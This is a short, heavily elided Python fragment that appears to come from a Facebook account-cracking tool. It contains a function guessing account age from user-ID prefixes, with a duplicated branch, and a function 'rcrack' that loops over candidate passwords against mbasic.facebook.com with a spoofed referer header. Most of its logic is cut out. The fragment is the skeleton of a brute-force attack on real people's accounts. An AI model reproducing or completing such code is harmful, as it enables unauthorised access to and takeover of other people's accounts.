...
def samiya(uid):
    if len(uid)==15:
        ...
        elif uid[:5] in ['10003']           :riddu = '√ 2022'
        elif uid[:5] in ['10003']           :riddu = '√ 2022'
        else:riddu=''
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=Afdlpy8EAS7UyvYhpzHN7bKAX_ztVpfnIIW6E8q0PXFScd5z5vj8-IjngIGbQbhfcPT25l2eGL530ZlfmKaNv2QxbOMi9c17JHG5tmk-6r3GQg&smuh=4100&lh=Ac-OXAeZ0BYiQ5gT7OU&ref=wizard&_rdr',
